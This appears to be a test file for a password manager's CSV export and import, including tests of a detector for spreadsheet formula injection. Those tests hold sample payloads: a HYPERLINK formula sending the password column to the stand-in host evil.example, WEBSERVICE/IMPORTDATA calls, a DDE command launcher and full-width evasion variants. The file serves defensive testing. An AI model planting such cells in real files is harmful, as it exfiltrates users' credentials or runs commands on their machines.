import { describe, it, expect } from 'vitest';
import * as kdbxweb from 'kdbxweb';
import { installMockWindow, cred } from './helpers';

installMockWindow();
const { ExportService } = await import('../src/services/ExportService');
const { ImportService } = await import('../src/services/ImportService');

const makeDb = async () => {
    const db0 = kdbxweb.Kdbx.create(cred(), 'Vault');
    db0.setVersion(3);
    const root = db0.getDefaultGroup();

    const site = db0.createEntry(root);
    site.fields.set('Title', 'Site "quoted", with comma');
    site.fields.set('UserName', 'user');
    site.fields.set('Password', kdbxweb.ProtectedValue.fromString('p@ss'));
    site.fields.set('URL', 'https://example.com');
    site.fields.set('Notes', 'line1\nline2');

    const work = db0.createGroup(root, 'Work');
    const mail = db0.createGroup(work, 'Mail');
    const gh = db0.createEntry(mail);
    gh.fields.set('Title', 'GitHub');
    gh.fields.set('UserName', 'octo');
    gh.fields.set('Password', kdbxweb.ProtectedValue.fromString('hub-pass'));
    gh.fields.set('otp', kdbxweb.ProtectedValue.fromString(
        'otpauth://totp/GitHub?secret=GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ'
    ));

    // an entry in the recycle bin must not be exported
    db0.createRecycleBin();
    const binned = db0.createEntry(root);
    binned.fields.set('Title', 'Deleted');
    binned.fields.set('Password', kdbxweb.ProtectedValue.fromString('gone'));
    db0.move(binned, db0.getGroup(db0.meta.recycleBinUuid!)!);

    return await kdbxweb.Kdbx.load(await db0.save(), cred());
};

describe('csv export', () => {
    it('exports all entries with group paths, quoting and TOTP', async () => {
        const db = await makeDb();
        const csv = ExportService.toCsv(db);
        const rows = ImportService.parseCsv(csv);

        expect(rows[0]).toEqual(ExportService.CSV_HEADERS);
        expect(rows).toHaveLength(3); // header + 2 entries, recycle bin excluded
        expect(csv).not.toContain('Deleted');

        const site = rows.find(r => r[1].startsWith('Site'))!;
        expect(site[0]).toBe('Vault');
        expect(site[1]).toBe('Site "quoted", with comma');
        expect(site[3]).toBe('p@ss');
        expect(site[5]).toBe('line1\nline2');

        const gh = rows.find(r => r[1] === 'GitHub')!;
        expect(gh[0]).toBe('Vault/Work/Mail');
        expect(gh[6]).toMatch(/^otpauth:\/\/totp\//);
        expect(gh[6]).toContain('GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ');
        expect(gh[8]).toMatch(/^\d{4}-\d{2}-\d{2}T/); // ISO last modified
    });

    it('counts exportable entries and names the file after the database', async () => {
        const db = await makeDb();
        expect(ExportService.entryCount(db)).toBe(2);
        expect(ExportService.exportFileName(db)).toBe('Vault-export.csv');
    });

    it('round-trips through the importer as a KeePassXC file', async () => {
        const db = await makeDb();
        const csv = ExportService.toCsv(db);
        const result = await ImportService.parseFile(new File([csv], 'Vault-export.csv'));

        expect(result.source).toBe('KeePassXC');
        expect(result.entries).toHaveLength(2);

        const gh = result.entries.find(e => e.title === 'GitHub')!;
        // the root group name is stripped from the path
        expect(gh.group).toEqual(['Work', 'Mail']);
        expect(gh.totp).toMatch(/^otpauth:\/\//);

        const site = result.entries.find(e => e.title.startsWith('Site'))!;
        expect(site.group).toBeUndefined();
        expect(site.notes).toBe('line1\nline2');
        expect(site.password).toBe('p@ss');
    });

    it('imports a real KeePassXC export header', async () => {
        const csv = '"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"\n'
            + '"Passwords/Web","Example","me","pw","https://example.com","","","0","2024-01-01T00:00:00Z","2024-01-01T00:00:00Z"\n';
        const result = await ImportService.parseFile(new File([csv], 'export.csv'));
        expect(result.source).toBe('KeePassXC');
        expect(result.entries[0]).toMatchObject({
            title: 'Example', username: 'me', password: 'pw', group: ['Web'],
        });
    });
});

// Spreadsheets run a cell opening with =, +, - or @. The export deliberately
// does not defuse those (a prefix would survive into the data and come back on
// the next import), so the export dialog warns instead, and the value of that
// warning depends entirely on it staying quiet for ordinary data
describe('spreadsheet formula detection', () => {
    it('flags a formula that can reach the password column', () => {
        expect(ExportService.looksLikeFormula(
            '=HYPERLINK("https://evil.example/?d="&D2,"Account details")'
        )).toBe(true);
    });

    it('flags the other trigger characters and the sheets fetchers', () => {
        expect(ExportService.looksLikeFormula('@SUM(A1:A9)')).toBe(true);
        expect(ExportService.looksLikeFormula('+WEBSERVICE("http://evil.example")')).toBe(true);
        expect(ExportService.looksLikeFormula('=IMPORTDATA("http://evil.example")')).toBe(true);
        expect(ExportService.looksLikeFormula('-HYPERLINK("http://evil.example","x")')).toBe(true);
    });

    // Reaches out through a pipe rather than a call, so neither the function
    // pattern nor a trigger alone would catch it
    it('flags the legacy DDE process launcher', () => {
        expect(ExportService.looksLikeFormula("=cmd|'/c calc'!A1")).toBe(true);
    });

    // Leading whitespace does make a spreadsheet read the cell as text, and a
    // tab is OWASP's suggested mitigation, but OWASP warns it comes undone
    // when Excel saves and reopens the file. So it is skipped, not trusted
    it('sees through leading whitespace of every kind', () => {
        for (const prefix of ['\t', ' ', '\r\n', '  \t ']) {
            expect(ExportService.looksLikeFormula(
                `${prefix}=HYPERLINK("http://e.example","x")`
            )).toBe(true);
        }
    });

    // The documented way past a check that only knows the ASCII characters
    it('flags the full-width forms of the trigger characters', () => {
        expect(ExportService.looksLikeFormula('＝HYPERLINK("http://e.example","x")')).toBe(true);
        expect(ExportService.looksLikeFormula('＋WEBSERVICE("http://e.example")')).toBe(true);
        expect(ExportService.looksLikeFormula('－HYPERLINK("http://e.example","x")')).toBe(true);
        expect(ExportService.looksLikeFormula('＠SUM(A1:A9)')).toBe(true);
        // and the full-width bracket, which would otherwise hide the call
        expect(ExportService.looksLikeFormula('=HYPERLINK（"http://e.example"）')).toBe(true);
    });

    it('stays quiet for ordinary data that merely starts with a trigger', () => {
        expect(ExportService.looksLikeFormula('-hunter2')).toBe(false);
        expect(ExportService.looksLikeFormula('=== keys ===')).toBe(false);
        expect(ExportService.looksLikeFormula('@octocat')).toBe(false);
        expect(ExportService.looksLikeFormula('+1 (555) 0100')).toBe(false);
        expect(ExportService.looksLikeFormula('=2+2')).toBe(false);
        expect(ExportService.looksLikeFormula('')).toBe(false);
    });

    // Prose in a note routinely puts a bracket after a word; a real payload
    // never puts a space before it
    it('does not flag prose with a bracketed aside', () => {
        expect(ExportService.looksLikeFormula('=Total (see below)')).toBe(false);
    });

    it('stays quiet for a value holding a call but no trigger', () => {
        expect(ExportService.looksLikeFormula('SUM(A1)')).toBe(false);
        expect(ExportService.looksLikeFormula('see HYPERLINK(x) for more')).toBe(false);
    });

    it('names the entry and column of every risky cell, and nothing otherwise', async () => {
        const db = await makeDb();
        const clean = ExportService.formulaRisks(ExportService.collectRows(db));
        expect(clean).toEqual([]);

        const root = db.getDefaultGroup();
        const bad = db.createEntry(root);
        bad.fields.set('Title', 'Payroll');
        bad.fields.set('Notes', '=HYPERLINK("https://evil.example/?d="&D2,"details")');

        const risks = ExportService.formulaRisks(ExportService.collectRows(db));
        expect(risks).toEqual([{ title: 'Payroll', column: 'Notes' }]);
    });

    it('leaves the exported bytes untouched, warning being the whole response', async () => {
        const db = await makeDb();
        const payload = '=HYPERLINK("https://evil.example","x")';
        const bad = db.createEntry(db.getDefaultGroup());
        bad.fields.set('Title', 'Payroll');
        bad.fields.set('Notes', payload);

        // Quoted as any other field is, with no prefix added to defuse it:
        // the trigger is still the first character inside the quotes
        const csv = ExportService.toCsv(db);
        expect(csv).toContain(`"${payload.replace(/"/g, '""')}"`);
        expect(csv).not.toContain(`"'=`);
    });
});
